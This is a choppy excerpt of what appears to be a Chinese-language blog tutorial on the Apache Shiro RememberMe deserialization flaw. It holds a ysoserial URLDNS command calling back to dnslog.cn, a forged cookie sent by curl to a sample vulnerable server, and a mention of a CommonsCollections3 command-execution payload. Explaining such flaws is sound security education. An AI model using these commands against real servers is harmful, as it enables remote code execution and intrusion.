...
Object restoredObject = ois.readObject();  // 这里可能有安全风险！
    ...
    <pre><code>用户身份信息 → 序列化 → AES加密 → Base64编码 → RememberMe Cookie
</code></pre>
    <h4>
     当用户再次访问时（读取过程）：
    </h4>
    <pre><code>RememberMe Cookie → Base64解码 → AES解密 → 反序列化 → 用户身份信息
</code></pre>
    <p>
     这个过程中最关键的问题是：
    </p>
...
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
    ...
    <pre><code>java -jar ysoserial.jar URLDNS "http://dnslog.cn/xyz123" &gt; urldns.txt
</code></pre>
    <p>
     这里使用URLDNS链条是因为它只需要Java内置类，适合用来验证漏洞是否存在。它的工作原理是：
    </p>
    <pre><code>// URLDNS链条的核心原理
...
String rememberMeCookie = Base64.getEncoder().encodeToString(combined);
    ...
    <pre><code>Cookie: rememberMe=AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0...
</code></pre>
    <p>
     可以使用各种工具发送这个请求：
    </p>
    <pre><code>curl -v -H "Cookie: rememberMe=AAECAwQ..." http://vulnerable-server.com
</code></pre>
    <h4>
     步骤4：确认漏洞存在
    </h4>
    ...
    <pre><code># 使用CommonsCollections3生成执行命令的payload
...
// FastJson数据（文本格式）
{
  ...
  "autoCommit":true
    ...
    <pre><code>RememberMeManager rememberMeManager = new CookieRememberMeManager();
...
rememberMeManager.setCipherKey(cipherKey);
 ...
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f36333934393231362f:61727469636c652f64657461696c732f313436313838393537" class_="artid" style="display:none">
 </p>
</div>
